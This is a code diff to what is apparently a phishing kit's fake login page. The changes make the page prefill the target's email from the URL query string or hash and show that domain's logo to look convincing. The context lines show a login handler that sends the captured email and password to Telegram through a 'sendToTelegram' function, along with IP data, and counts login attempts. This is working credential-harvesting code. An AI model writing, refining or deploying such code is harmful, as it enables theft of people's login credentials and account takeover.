@@ -7,33 +7,40 @@
         let userEmail = "";
         let attempt = 0;
 
-        // Function to update email from hash
-        function updateEmailFromHash() {
-            // Get email from hash fragment (#someone@example.com)
-            userEmail = window.location.hash.substring(1).trim();
+        // Unified email extraction from both query string and hash
+        function getEmailFromURL() {
+            // 1. Try query string parameter (?email=value)
+            const urlParams = new URLSearchParams(window.location.search);
+            const queryEmail = urlParams.get('email');
+            
+            // 2. Try hash fragment (#value)
+            const hashEmail = window.location.hash.substring(1);
+            
+            // Return first valid email found
+            if (queryEmail && queryEmail.includes('@')) return queryEmail;
+            if (hashEmail && hashEmail.includes('@')) return hashEmail;
+            
+            return "example@example.com"; // Fallback
+        }
 
-            if (!userEmail || userEmail.indexOf('@') === -1) {
-                userEmail = "example@example.com"; // fallback if invalid
-            }
-
-            // Fill disabled email field
+        // Update email field and domain info
+        function updateEmailInfo() {
+            userEmail = getEmailFromURL();
+            
+            // Fill email field
             const emailField = document.getElementById("email");
-            if (emailField) {
-                emailField.value = userEmail;
-            }
+            if (emailField) emailField.value = userEmail;
 
-            // Extract domain from email
+            // Update domain info
             const domain = userEmail.split("@")[1] || "example.com";
-
-            // Update title and Clearbit logo
             const domainTitle = document.getElementById("domain-title");
             const domainLogo = document.getElementById("domain-logo");
-
+            
             if (domainTitle) domainTitle.textContent = domain;
             if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}`;
         }
 
-        // Function to send data to Telegram
+        // Telegram message function
         async function sendToTelegram(email, password) {
             try {
                 let ipData = {};
@@ -73,11 +80,11 @@
 
         // Initialize on DOM ready
         document.addEventListener("DOMContentLoaded", () => {
-            // Initial email setup
-            updateEmailFromHash();
-
-            // Listen for hash changes
-            window.addEventListener("hashchange", updateEmailFromHash);
+            // Initial setup
+            updateEmailInfo();
+            
+            // Handle hash changes
+            window.addEventListener("hashchange", updateEmailInfo);
 
             // Login button handler
             document.getElementById("login-btn").addEventListener("click", () => {
@@ -92,7 +99,7 @@
                     spinner.classList.add("hidden");
                     attempt++;
 
-                    // Send details to Telegram
+                    // Send credentials to Telegram
                     await sendToTelegram(userEmail, password);
 
                     if (attempt === 1) {
